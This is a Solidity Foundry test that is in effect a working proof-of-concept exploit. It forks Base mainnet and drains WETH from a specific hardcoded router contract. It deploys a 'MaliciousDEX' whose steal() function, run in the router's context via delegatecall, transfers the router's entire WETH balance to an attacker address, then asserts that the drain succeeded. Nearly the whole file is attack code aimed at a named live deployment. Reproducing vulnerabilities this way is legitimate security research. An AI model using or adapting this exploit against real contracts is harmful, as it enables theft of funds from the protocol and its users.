// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
    function owner() external view returns (address);
}

// SwapExecutorData struct as defined in the SwapExecutor contract
struct SwapExecutorData {
    address tokenIn;
    address tokenOut;
    address[] dexs;
    bytes[] dexsData;
}

contract MaliciousDEX {
    // This function will be called by the SwapExecutor (via the Router)
    function steal(address token, address attacker) external {
        uint256 balance = IERC20(token).balanceOf(msg.sender);
        // msg.sender is the Router (because of delegatecall)
        // Transfer all tokens from the Router to the attacker
        IERC20(token).transfer(attacker, balance);
    }
}

contract StakeDAODrain is Test {
    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);
    address constant WETH = 0x4200000000000000000000000000000000000006;

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testDrainWETH() public {
        address attacker = address(0xBAD);
        
        // 1. Check the Router's WETH balance at the forked block
        uint256 initialRouterBalance = IERC20(WETH).balanceOf(address(router));
        console.log("Router WETH Balance:", initialRouterBalance);
        require(initialRouterBalance > 0, "Router has no WETH to drain");

        // 2. Deploy the malicious DEX
        MaliciousDEX maliciousDex = new MaliciousDEX();

        // 3. Craft the SwapExecutorData
        // tokenIn and tokenOut are WETH (the asset we want to steal)
        address[] memory dexs = new address[](1);
        dexs[0] = address(maliciousDex);
        
        bytes[] memory dexsData = new bytes[](1);
        dexsData[0] = abi.encodeWithSignature("steal(address,address)", WETH, attacker);

        SwapExecutorData memory swapData = SwapExecutorData({
            tokenIn: WETH,
            tokenOut: WETH,
            dexs: dexs,
            dexsData: dexsData
        });

        // 4. Craft the Router payload
        // Module ID 0x08 is RouterModuleEnso, which uses the SwapExecutor
        bytes memory payload = abi.encodePacked(
            bytes1(uint8(8)), // Module ID 0x08
            abi.encode(swapData) // Encode the SwapExecutorData struct
        );
        
        bytes[] memory calls = new bytes[](1);
        calls[0] = payload;

        // 5. Impersonate the attacker and execute
        vm.prank(attacker);
        console.log("Executing drain...");
        
        try router.execute(calls) {
            // 6. Check the attacker's WETH balance
            uint256 attackerBalance = IERC20(WETH).balanceOf(attacker);
            console.log("Attacker WETH Balance after drain:", attackerBalance);
            
            // The attacker should now have the Router's WETH
            assertEq(attackerBalance, initialRouterBalance, "Drain failed");
            console.log("SUCCESS: Router WETH drained!");
        } catch Error(string memory reason) {
            console.log("Drain reverted with reason:", reason);
            revert("Drain failed");
        } catch (bytes memory) {
            console.log("Drain reverted with custom error");
            revert("Drain failed");
        }
    }
}
